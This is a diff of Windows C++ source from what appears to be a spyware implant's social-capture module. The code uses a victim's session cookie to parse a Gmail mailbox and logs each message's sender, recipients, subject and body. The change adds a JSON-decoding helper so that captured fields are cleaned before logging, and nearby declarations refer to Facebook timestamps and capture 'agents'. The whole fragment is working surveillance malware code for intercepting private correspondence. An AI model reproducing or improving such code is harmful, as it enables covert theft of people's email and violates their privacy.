@@ -1,8 +1,10 @@
 #include <windows.h>
+#include <string>
 #include <stdio.h>
 #include <time.h>
 #include "..\common.h"
 #include "..\LOG.h"
+#include "..\JSON\JSON.h"
 #include "SocialMain.h"
 #include "NetworkHandler.h"
 
@@ -16,8 +18,25 @@
 
 extern DWORD GetLastFBTstamp(char *user, DWORD *hi_part);
 extern void SetLastFBTstamp(char *user, DWORD tstamp_lo, DWORD tstamp_hi);
+extern WCHAR *UTF8_2_UTF16(char *str); // in firefox.cpp
 
 extern BOOL bPM_MailCapStarted; // variabili per vedere se gli agenti interessati sono attivi
+
+void JsonDecode(char *string)
+{
+	WCHAR *string_16, *ptr;
+	DWORD size;
+	std::wstring decode_16=L"";
+
+	size = strlen(string);
+	ptr = string_16 = UTF8_2_UTF16(string);
+	if (!string_16) 
+		return;
+	JSON::ExtractString((const wchar_t **)&string_16, decode_16);
+	if (wcslen(decode_16.c_str())>0)
+		WideCharToMultiByte(CP_UTF8, 0, decode_16.c_str(), -1, string, size, 0 , 0);
+	SAFE_FREE(ptr);
+}
 
 DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp_hi, DWORD last_tstamp_lo, BOOL is_incoming)
 {
@@ -134,6 +153,12 @@ DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp_hi,
 		*ptr_inner2 = 0;
 
 		CheckProcessStatus();
+		
+		JsonDecode(src_add);
+		JsonDecode(dest_add);
+		JsonDecode(cc_add);
+		JsonDecode(subject);
+		JsonDecode(ptr_inner);
 		LogSocialMailMessage(MAIL_GMAIL, src_add, dest_add, cc_add, subject, ptr_inner, is_incoming);
 	
 		SAFE_FREE(r_buffer_inner);
